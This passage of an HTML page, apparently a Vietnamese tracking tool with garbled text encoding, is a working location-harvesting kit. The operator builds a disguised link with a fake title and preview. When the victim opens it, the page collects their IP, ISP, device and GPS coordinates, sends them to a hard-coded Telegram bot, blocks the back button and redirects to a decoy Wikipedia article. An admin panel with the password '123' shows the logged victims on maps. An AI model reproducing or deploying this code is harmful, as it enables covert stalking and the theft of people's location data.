        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        @keyframes pulse { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(35, 134, 54, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(35, 134, 54, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(35, 134, 54, 0); } }

</head>
<body id="main-body" class="victim-body">

    <div id="ui-victim">
        <div class="loader" style="margin: 0 auto;"></div>
        <div id="status-msg" class="mt-4 text-[#777] text-[13px] text-center italic">ƒêang t·∫£i...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-6">
                <div>
                    <h1 class="text-2xl font-black text-white italic uppercase tracking-tighter uppercase">BCA 
                        </h1>
                    <p class="text-[9px] text-gray-500 uppercase tracking-widest"><span class="live-dot"></span>H·ªá th·ªëng gi√°m s√°t t·ªëi th∆∞·ª£ng</p>
                </div>
                <button onclick="logout()" class="text-[10px] bg-red-950/20 text-red-500 border border-red-900/50 px-4 py-2 rounded-xl font-bold uppercase">Logout</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">

                    <div class="glass p-5 space-y-4 shadow-2xl">
                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest italic border-b border-gray-800 pb-2">1. S·ª≠a Ng·ª•y Trang & Preview</h3>
                        <div class="space-y-3">
                            <input id="ed-title" type="text" placeholder="Ti√™u ƒë·ªÅ b√†i vi·∫øt" class="input-dark" oninput="updateUI()">
                            <textarea id="ed-desc" placeholder="M√¥ t·∫£ ng·ª•y trang" class="input-dark h-16 resize-none" oninput="updateUI()"></textarea>
                            <input id="ed-img" type="text" placeholder="Link ·∫£nh ƒë·∫°i di·ªán (URL)" class="input-dark" oninput="updateUI()">
                        </div>
                        <div class="preview-card mt-2">
                            <img id="pre-img" src="" class="preview-img">
                            <div class="p-3">

                                <div id="pre-desc" class="text-[10px] text-gray-500 line-clamp-2 mt-1 italic leading-relaxed">...</div>
                            </div>
                        </div>
                    </div>

                    <div class="glass p-5 space-y-4 shadow-2xl">
                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest italic border-b border-gray-800 pb-2">2. Bot Config & Robot</h3>
                        <div class="grid grid-cols-2 gap-2">
                            <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                            <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        </div>
                        <input id="cfg-rd" type="text" placeholder="Link ƒë√≠ch sau khi thu ho·∫°ch" class="input-dark">
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u..." class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase shadow-lg transition-all">T·∫†O LINK THU HO·∫†CH</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center leading-relaxed"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-7">
                    <div class="glass min-h-[600px] flex flex-col overflow-hidden shadow-2xl">
                        <div class="p-5 border-b border-gray-800 flex justify-between bg-black/20 text-white">
                            <h3 class="text-[11px] font-black uppercase italic tracking-widest">Live Operations Logs</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 font-bold uppercase">X√≥a h·∫øt</button>
                        </div>
                        <div class="overflow-x-auto flex-1 font-sans">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px] font-bold">
                                    <tr><th class="p-4">Target / TB</th><th class="p-4">M·∫°ng (IP/ISP)</th><th class="p-4">V·ªã tr√≠ (Geo)</th><th class="p-4 text-right">Map</th></tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            mt: "Ti·ªÉu s·ª≠ ƒê√†o Minh Qu√¢n",
            md: "ƒê√†o Minh Qu√¢n...",
            mi: "https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v38_auth') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('v38_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { 
                lockBack();
                startOmniPhantom(); 
            }
        };

        function lockBack() {
            history.pushState(null, null, location.href);
            window.onpopstate = () => { history.go(1); document.getElementById('status-msg').innerText = "Vui l√≤ng ch·ªù..."; };
        }

        function getDevice() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android";
            if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
            return "Windows/Mac";
        }

        async function startOmniPhantom() {
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
                document.title = config.mt;
            } catch(e) {}

            const target = urlParams.get('name') || 'GUEST';
            const device = getDevice();
            let logData = { name: target, device: device, time: new Date().toLocaleTimeString(), st: 'IP' };

            // B∆Ø·ªöC 1: L·∫§Y IP & ISP (IPWHO.IS - HTTPS OK)
            try {
                const res = await fetch('https://ipwho.is/').then(r => r.json());
                if(res.success) {
                    logData.ip = res.ip;
                    logData.isp = res.connection.isp;
                    logData.address = res.city + ", " + res.country;
                    logData.lat = res.latitude;
                    logData.lon = res.longitude;
                    
                    saveLog(logData);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b>\nüì± TB: " + device + "\nüåê IP: " + res.ip + "\nüè¢ ISP: " + res.connection.isp)}`);
                }
            } catch(e) {}

            const jump = () => window.location.replace(config.r);

            // B∆Ø·ªöC 2: √âP GPS & REVERSE GEO
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = `T·ªça ƒë·ªô: ${lat}, ${lon}`;
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}
                    
                    logData.lat = lat; logData.lon = lon; logData.address = fullAddr; logData.st = 'GPS';
                    saveLog(logData);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + V·ªä TR√ç + "</b> OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
                    jump();
                }, jump, { timeout: 6000 });
            } else { jump(); }
            setTimeout(jump, 9000);
        }

        // --- ADMIN ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            const saved = localStorage.getItem('v38_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('ed-title').value = config.mt;
            document.getElementById('ed-desc').value = config.md;
            document.getElementById('ed-img').value = config.mi;
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            updateUI(); renderLogs();
            setInterval(renderLogs, 3000);
        }

        function updateUI() {
            document.getElementById('pre-title').innerText = document.getElementById('ed-title').value || "...";
            document.getElementById('pre-desc').innerText = document.getElementById('ed-desc').value || "...";
            document.getElementById('pre-img').src = document.getElementById('ed-img').value || "";
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('ed-title').value;
            config.md = document.getElementById('ed-desc').value;
            config.mi = document.getElementById('ed-img').value;
            localStorage.setItem('v38_cfg', JSON.stringify(config));
            
            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const link = window.location.href.split('?')[0] + "?name=" + encodeURIComponent(document.getElementById('in-name').value || 'Target') + "&v=" + v;
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
        }

        function saveLog(data) {
            let logs = JSON.parse(localStorage.getItem('v38_logs') || '[]');
            if (logs.length > 0 && logs[0].name === data.name && data.st === 'GPS') logs[0] = data;
            else logs.unshift(data);
            localStorage.setItem('v38_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v38_logs') || '[]');
            const table = document.getElementById('log-list');
            if (logs.length === 0) { table.innerHTML = '<tr><td colspan="4" class="p-10 text-center text-gray-700">Ch·ªù d·ªØ li·ªáu...</td></tr>'; return; }
            table.innerHTML = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4"><b>${l.name}</b><br><span class="text-[9px] text-blue-500 font-bold">${l.device}</span><br><span class="text-[8px] text-gray-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip || '---'}<br><span class="text-[8px] text-gray-500 uppercase">${l.isp || ''}</span></td>
                    <td class="p-4 text-gray-300 text-[9px] leading-tight max-w-[200px]">${l.address || 'ƒêang x√°c ƒë·ªãnh...'}</td>
                    <td class="p-4 text-right">
                        <a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="bg-blue-600/20 text-blue-500 px-2 py-1 rounded text-[9px] font-black uppercase">MAP</a>
                    </td>
                </tr>
            `).join('');
        }

        function clearLogs() { if(confirm("X√≥a?")) { localStorage.removeItem('v38_logs'); renderLogs(); } }
        function logout() { localStorage.removeItem('v38_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy!"); }
    </script>
</body>
</html>
